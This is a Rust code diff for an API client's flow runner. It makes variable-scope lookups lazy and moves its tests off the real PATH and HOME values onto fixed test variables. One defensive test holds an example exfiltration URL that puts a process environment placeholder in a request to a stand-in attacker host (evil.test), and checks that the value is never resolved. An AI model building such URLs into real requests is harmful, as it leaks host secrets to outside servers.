@@ -26,6 +26,12 @@ use crate::process_env::ProcessEnv;
 use crate::redaction::{mask_forms, MIN_REDACTION_LEN};
 use crate::runner_sequence::{build_step_input, RunItem};
 
+#[cfg(test)]
+thread_local! {
+    /// Counts the plan-time scope builds on this thread, so a test can prove they are lazy.
+    static PLAN_SCOPE_BUILDS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
+}
+
 /// One node's fully-executed result, kept around so a downstream edge's
 /// wiring expression can be evaluated against it.
 #[derive(Debug, Clone)]
@@ -1214,14 +1220,8 @@ impl FlowExecutionService {
         // Plain scope values only: no RocketVault and no `process.env`, so a change
         // to those does not invalidate a cached run.
         // Raw values: a `$` name inside a value would expand to a new value each run.
-        let plain_vars = exec
-            .flow_variable_scopes(
-                input.global_env_name.as_deref(),
-                Some(&input.collection),
-                input.environment_name.as_deref(),
-                &HashMap::new(),
-            )
-            .flatten();
+        // The scopes are read lazily, only when some text has `{{`.
+        let plain_vars: std::cell::OnceCell<HashMap<String, String>> = std::cell::OnceCell::new();
         let fingerprints = crate::flow_run_cache::fingerprints(
             &flow,
             &order,
@@ -1230,11 +1230,24 @@ impl FlowExecutionService {
                     .get(path)
                     .map(crate::flow_run_cache::saved_request_text)
             },
-            &|text| crate::flow_run_cache::plain_placeholder_hash(text, &plain_vars),
+            &|text| {
+                let vars = plain_vars.get_or_init(|| {
+                    #[cfg(test)]
+                    PLAN_SCOPE_BUILDS.with(|c| c.set(c.get() + 1));
+                    exec.flow_variable_scopes(
+                        input.global_env_name.as_deref(),
+                        Some(&input.collection),
+                        input.environment_name.as_deref(),
+                        &HashMap::new(),
+                    )
+                    .flatten()
+                });
+                crate::flow_run_cache::plain_placeholder_hash(text, vars)
+            },
         );
         // A partial run is checked before any secret is fetched or event sent, so
-        // a refusal sends no event. Planning above already read the variable
-        // scopes, including the OS keychain for secret variables.
+        // a refusal sends no event. Planning above reads the variable scopes only
+        // when some text has a placeholder, including the OS keychain for secrets.
         let prepared = match &partial {
             Some(p) => {
                 Some(self.prepare_partial(&input, &flow, &order, &saved, &fingerprints, p)?)
@@ -2609,6 +2622,29 @@ fn failed_step(node_id: &str, message: String) -> FlowStepResult {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    const HOST_A_VALUE: &str = "host-flow-value-a-5521";
+    const HOST_B_VALUE: &str = "host-flow-value-b-7734";
+
+    /// Sets the unique host variables once. They hold fixed values and are never
+    /// removed, so parallel tests cannot race on them.
+    fn set_host_vars() {
+        static SET: std::sync::Once = std::sync::Once::new();
+        SET.call_once(|| {
+            std::env::set_var("ROCKET_TEST_HOST_FLOW_A", HOST_A_VALUE);
+            std::env::set_var("ROCKET_TEST_HOST_FLOW_B", HOST_B_VALUE);
+        });
+    }
+
+    fn host_a() -> String {
+        set_host_vars();
+        HOST_A_VALUE.to_string()
+    }
+
+    fn host_b() -> String {
+        set_host_vars();
+        HOST_B_VALUE.to_string()
+    }
     use crate::test_doubles::NullCollectionRepo;
     use async_trait::async_trait;
     use rocket_collection::{CollectionSettings, Request};
@@ -4587,7 +4623,7 @@ mod tests {
         let service = service_with_saved_request(
             auth_and_request_flow(false, vec![auth_wire()]),
             Auth::Basic {
-                username: "in".to_string(),
+                username: "own".to_string(),
                 password: "own".to_string(),
             },
         );
@@ -4848,6 +4884,7 @@ mod tests {
         executor: &Arc<RecordingExecutor>,
         engine: Box<dyn ScriptEngine>,
     ) -> RequestExecutionService {
+        set_host_vars();
         RequestExecutionService::new(
             Box::new(NullEnvRepo),
             Arc::new(SharedExecutor(Arc::clone(executor))),
@@ -10664,6 +10701,7 @@ mod tests {
 
     /// Runs `flow` against `exec` in environment `dev`.
     async fn run_dev_flow(flow: Flow, exec: &RequestExecutionService) -> FlowRunSummary {
+        set_host_vars();
         let service = FlowExecutionService::new(
             Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
             Box::new(FakeCollectionRepo::new().build()),
@@ -10687,6 +10725,22 @@ mod tests {
             }],
             callback_host: None,
         }
+    }
+
+    #[tokio::test]
+    async fn a_run_without_placeholders_reads_no_variable_scopes() {
+        let executor = RecordingExecutor::new();
+        let exec = host_env_exec(&executor);
+        PLAN_SCOPE_BUILDS.with(|c| c.set(0));
+
+        let summary = run_dev_flow(input_to_output_flow("plain text"), &exec).await;
+
+        assert_eq!(summary.steps.len(), 2);
+        assert_eq!(PLAN_SCOPE_BUILDS.with(|c| c.get()), 0);
+
+        run_dev_flow(input_to_output_flow("has {{name}} in it"), &exec).await;
+
+        assert_eq!(PLAN_SCOPE_BUILDS.with(|c| c.get()), 1);
     }
 
     fn withheld_logs(step: &FlowStepResult) -> usize {
@@ -10823,7 +10877,7 @@ mod tests {
     #[tokio::test]
     async fn flow_auth_fetched_token_stays_literal() {
         use crate::flow_auth::test_support::CapturingFetcher;
-        let fetcher = CapturingFetcher::ok("{{process.env.PATH}}");
+        let fetcher = CapturingFetcher::ok("{{process.env.ROCKET_TEST_HOST_FLOW_A}}");
         let executor = RecordingExecutor::new();
         let (exec, _) = dotenv_exec(true, &executor);
 
@@ -10832,7 +10886,7 @@ mod tests {
         assert_eq!(
             executor.sent_auths(),
             vec![rocket_shared::types::Auth::Bearer {
-                token: "{{process.env.PATH}}".to_string()
+                token: "{{process.env.ROCKET_TEST_HOST_FLOW_A}}".to_string()
             }]
         );
     }
@@ -10914,7 +10968,11 @@ mod tests {
     async fn flow_input_node_resolves_process_env_when_allowed() {
         let (exec, _) = dotenv_exec(true, &RecordingExecutor::new());
 
-        let summary = run_dev_flow(input_to_output_flow("{{process.env.PATH}}"), &exec).await;
+        let summary = run_dev_flow(
+            input_to_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
+            &exec,
+        )
+        .await;
 
         // The host value was used, so every step shows it masked.
         assert_eq!(
@@ -10927,11 +10985,15 @@ mod tests {
     async fn flow_input_node_keeps_process_env_literal_when_denied() {
         let (exec, _) = dotenv_exec(false, &RecordingExecutor::new());
 
-        let summary = run_dev_flow(input_to_output_flow("{{process.env.PATH}}"), &exec).await;
+        let summary = run_dev_flow(
+            input_to_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
+            &exec,
+        )
+        .await;
 
         assert_eq!(
             step_of(&summary, "out").value.as_deref(),
-            Some("{{process.env.PATH}}")
+            Some("{{process.env.ROCKET_TEST_HOST_FLOW_A}}")
         );
     }
 
@@ -10967,7 +11029,9 @@ mod tests {
     #[tokio::test]
     async fn flow_input_node_warns_once_when_withheld() {
         let (exec, _) = dotenv_exec(false, &RecordingExecutor::new());
-        let flow = input_to_output_flow("{{process.env.PATH}}-{{process.env.HOME}}");
+        let flow = input_to_output_flow(
+            "{{process.env.ROCKET_TEST_HOST_FLOW_A}}-{{process.env.ROCKET_TEST_HOST_FLOW_B}}",
+        );
 
         let summary = run_dev_flow(flow, &exec).await;
 
@@ -11049,8 +11113,7 @@ mod tests {
     async fn static_bearer_from_process_env_is_masked_in_the_trace() {
         use rocket_shared::types::Auth;
 
-        // `PATH` is always set, so no test has to change the process environment.
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
         let env = Arc::new(std::sync::Mutex::new(env_with(&[])));
         let executor = LoginEchoExecutor::new(&env, "unused");
         let exec = RequestExecutionService::new(
@@ -11071,7 +11134,7 @@ mod tests {
         .with_trust_store(crate::test_doubles::InMemoryTrustStore::allow_all());
         let service = template_auth_service(
             Auth::Bearer {
-                token: "{{process.env.PATH}}".to_string(),
+                token: "{{process.env.ROCKET_TEST_HOST_FLOW_A}}".to_string(),
             },
             false,
         );
@@ -11118,6 +11181,7 @@ mod tests {
         executor: &Arc<RecordingExecutor>,
         collection: rocket_collection::Collection,
     ) -> RequestExecutionService {
+        set_host_vars();
         RequestExecutionService::new(
             Box::new(NullEnvRepo),
             Arc::new(SharedExecutor(Arc::clone(executor))),
@@ -11137,13 +11201,16 @@ mod tests {
 
     #[tokio::test]
     async fn wired_values_never_resolve_process_env() {
-        let attack = "https://evil.test/{{process.env.PATH}}";
+        let attack = "https://evil.test/{{process.env.ROCKET_TEST_HOST_FLOW_A}}";
         let flow = Flow {
             name: "wired".to_string(),
             nodes: vec![
                 request_flow_node("a", "https://api.example.com/a"),
                 allow_wired_host(request_flow_node("b", "https://api.example.com/b")),
-                request_flow_node("c", "https://api.example.com/c?p={{process.env.PATH}}"),
+                request_flow_node(
+                    "c",
+                    "https://api.example.com/c?p={{process.env.ROCKET_TEST_HOST_FLOW_A}}",
+                ),
             ],
             edges: vec![
                 wire("e1", "a", "b"),
@@ -11165,7 +11232,7 @@ mod tests {
 
         service.run(&exec, run_input("wired")).await.expect("run");
 
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
         let urls = executor.sent_urls();
         assert!(urls.contains(&attack.to_string()), "{urls:?}");
         // Text from the saved request still resolves.
@@ -11233,6 +11300,7 @@ mod tests {
         expression: &str,
         a_body: &str,
     ) -> FlowRunSummary {
+        set_host_vars();
         let flow = Flow {
             name: "wired".to_string(),
             nodes: vec![
@@ -11346,19 +11414,19 @@ mod tests {
             .settings
             .variables
             .push(collection_var("apiKey", "k-123"));
-        collection
-            .settings
-            .variables
-            .push(collection_var("note", "{{process.env.HOME}}"));
+        collection.settings.variables.push(collection_var(
+            "note",
+            "{{process.env.ROCKET_TEST_HOST_FLOW_B}}",
+        ));
         let executor = RecordingExecutor::new();
-        // The host environment is open, so a rescan would fill `HOME`.
+        // The host environment is open, so a rescan would fill the host value.
         let exec = exec_with_collection(&executor, collection);
 
         run_body_wire(&exec, &executor, "return '{{note}}';", "x").await;
 
         assert_eq!(
             executor.sent_bodies()[1].as_deref(),
-            Some("{{process.env.HOME}}")
+            Some("{{process.env.ROCKET_TEST_HOST_FLOW_B}}")
         );
     }
 
@@ -11398,9 +11466,13 @@ mod tests {
     async fn a_used_host_value_is_masked_in_a_downstream_output() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
 
-        let summary = run_dev_flow(input_to_output_flow("{{process.env.PATH}}"), &exec).await;
+        let summary = run_dev_flow(
+            input_to_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
+            &exec,
+        )
+        .await;
 
         let shown = logs_and_traces(&summary);
         assert!(!shown.contains(&os_path), "{shown}");
@@ -11432,10 +11504,13 @@ mod tests {
     async fn a_used_host_value_is_masked_through_a_transform() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
 
-        let summary =
-            run_dev_flow(input_transform_output_flow("{{process.env.PATH}}"), &exec).await;
+        let summary = run_dev_flow(
+            input_transform_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
+            &exec,
+        )
+        .await;
 
         let shown = logs_and_traces(&summary);
         assert!(!shown.contains(&os_path), "{shown}");
@@ -11457,6 +11532,7 @@ mod tests {
         text: &str,
         poll: bool,
     ) -> FlowRunSummary {
+        set_host_vars();
         let mut r = saved_flow_node("r", "req.yml");
         if let FlowNodeKind::Request { repeat_until, .. } = &mut r.kind {
             if poll {
@@ -11504,9 +11580,14 @@ mod tests {
         for poll in [false, true] {
             let executor = RecordingExecutor::new();
             let exec = host_env_exec(&executor);
-            let os_path = std::env::var("PATH").expect("PATH is set");
+            let os_path = host_a();
 
-            let summary = run_input_into_logging_request(&exec, "{{process.env.PATH}}", poll).await;
+            let summary = run_input_into_logging_request(
+                &exec,
+                "{{process.env.ROCKET_TEST_HOST_FLOW_A}}",
+                poll,
+            )
+            .await;
 
             let step = step_of(&summary, "r");
             assert!(
@@ -11524,11 +11605,11 @@ mod tests {
     async fn a_partial_run_keeps_masking_a_host_value_the_base_run_used() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
         let service = FlowExecutionService::new(
             Box::new(FakeFlowRepository::new().with_flow(
                 "my-api",
-                input_transform_output_flow("{{process.env.PATH}}"),
+                input_transform_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
             )),
             Box::new(FakeCollectionRepo::new().build()),
             Box::new(NullEventPublisher),
@@ -11568,6 +11649,7 @@ mod tests {
         executor: &Arc<RecordingExecutor>,
         history: &Arc<InMemoryHistoryRepo>,
     ) -> RequestExecutionService {
+        set_host_vars();
         RequestExecutionService::new(
             Box::new(NullEnvRepo),
             Arc::new(SharedExecutor(Arc::clone(executor))),
@@ -11715,7 +11797,7 @@ mod tests {
     async fn a_value_no_node_used_stays_visible_downstream() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let home = std::env::var("HOME").expect("HOME is set");
+        let home = host_b();
 
         let summary = run_dev_flow(input_to_output_flow(&format!("at {home}")), &exec).await;
 
@@ -11757,12 +11839,12 @@ mod tests {
     async fn a_used_os_process_env_value_is_masked() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
 
         let summary = run_body_wire(
             &exec,
             &executor,
-            "console.log('{{process.env.PATH}}'); return 'x';",
+            "console.log('{{process.env.ROCKET_TEST_HOST_FLOW_A}}'); return 'x';",
             "x",
         )
         .await;
@@ -11780,10 +11862,10 @@ mod tests {
     async fn an_unused_os_process_env_value_is_not_masked() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let home = std::env::var("HOME").expect("HOME is set");
+        let home = host_b();
         let literal = serde_json::to_string(&home).expect("json");
         let expression =
-            format!("console.log('{{{{process.env.PATH}}}}'.length, {literal}); return 'x';");
+            format!("console.log('{{{{process.env.ROCKET_TEST_HOST_FLOW_A}}}}'.length, {literal}); return 'x';");
 
         let summary = run_body_wire(&exec, &executor, &expression, "x").await;
 
@@ -11798,9 +11880,13 @@ mod tests {
     async fn an_input_node_masks_a_used_os_process_env_value() {
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let os_path = std::env::var("PATH").expect("PATH is set");
+        let os_path = host_a();
 
-        let summary = run_dev_flow(input_to_output_flow("{{process.env.PATH}}"), &exec).await;
+        let summary = run_dev_flow(
+            input_to_output_flow("{{process.env.ROCKET_TEST_HOST_FLOW_A}}"),
+            &exec,
+        )
+        .await;
 
         let shown = format!("{:?}", step_of(&summary, "i"));
         assert!(!shown.contains(&os_path), "{shown}");
@@ -11826,12 +11912,12 @@ mod tests {
             edges: vec![
                 FlowEdge {
                     target_field: "body".to_string(),
-                    expression: "return '{{process.env.HOME}}';".to_string(),
+                    expression: "return '{{process.env.ROCKET_TEST_HOST_FLOW_B}}';".to_string(),
                     ..wire("e1", "a", "b")
                 },
                 FlowEdge {
                     target_field: "headers[X-H].value".to_string(),
-                    expression: "return '{{process.env.HOME}}';".to_string(),
+                    expression: "return '{{process.env.ROCKET_TEST_HOST_FLOW_B}}';".to_string(),
                     ..wire("e2", "c", "b")
                 },
             ],
@@ -12121,12 +12207,18 @@ mod tests {
         let exec = secret_var_exec(&executor)
             .with_trust_store(crate::test_doubles::InMemoryTrustStore::new());
 
-        let summary = run_body_wire(&exec, &executor, "return '{{process.env.HOME}}';", "x").await;
+        let summary = run_body_wire(
+            &exec,
+            &executor,
+            "return '{{process.env.ROCKET_TEST_HOST_FLOW_B}}';",
+            "x",
+        )
+        .await;
 
         assert_eq!(withheld_logs(step_of(&summary, "b")), 1);
         assert_eq!(
             executor.sent_bodies()[1].as_deref(),
-            Some("{{process.env.HOME}}")
+            Some("{{process.env.ROCKET_TEST_HOST_FLOW_B}}")
         );
     }
 
@@ -12543,7 +12635,7 @@ mod tests {
         );
     }
 
-    /// A flow whose client-credentials Auth node fetches `{{process.env.PATH}}` as its
+    /// A flow whose client-credentials Auth node fetches `{{process.env.ROCKET_TEST_HOST_FLOW_A}}` as its
     /// token, and a saved request `r` with `request_auth`. With no edges the node applies
     /// to inherit; with edges it reaches `r` only through them.
     fn fetched_token_service(
@@ -12551,6 +12643,7 @@ mod tests {
         edges: Vec<FlowEdge>,
         token: &str,
     ) -> FlowExecutionService {
+        set_host_vars();
         use crate::flow_auth::test_support::{FakeFetcher, SharedFetcher};
 
         let mut auth_node = client_credentials_auth_node("a");
@@ -12586,7 +12679,11 @@ mod tests {
 
         let executor = RecordingExecutor::new();
         let exec = host_env_exec(&executor);
-        let service = fetched_token_service(Auth::Inherit, Vec::new(), "{{process.env.PATH}}");
+        let service = fetched_token_service(
+            Auth::Inherit,
+            Vec::new(),
+            "{{process.env.ROCKET_TEST_HOST_FLOW_A}}",
+        );
 
         service
             .run(&exec, run_input("auth-req"))
@@ -12596,7 +12693,7 @@ mod tests {
         assert_eq!(
             executor.sent_auths(),
             vec![Auth::Bearer {
-                token: "{{process.env.PATH}}".to_string()
+                token: "{{process.env.ROCKET_TEST_HOST_FLOW_A}}".to_string()
             }]
         );
     }
@@ -12609,11 +12706,11 @@ mod tests {
         let exec = host_env_exec(&executor);
         let service = fetched_token_service(
             Auth::Basic {
-                username: "in".to_string(),
+                username: "own".to_string(),
                 password: "own".to_string(),
             },
             vec![auth_wire()],
-            "{{process.env.PATH}}",
+            "{{process.env.ROCKET_TEST_HOST_FLOW_A}}",
         );
 
         service
@@ -12624,7 +12721,7 @@ mod tests {
         assert_eq!(
             executor.sent_auths(),
             vec![Auth::Bearer {
-                token: "{{process.env.PATH}}".to_string()
+                token: "{{process.env.ROCKET_TEST_HOST_FLOW_A}}".to_string()
             }]
         );
     }
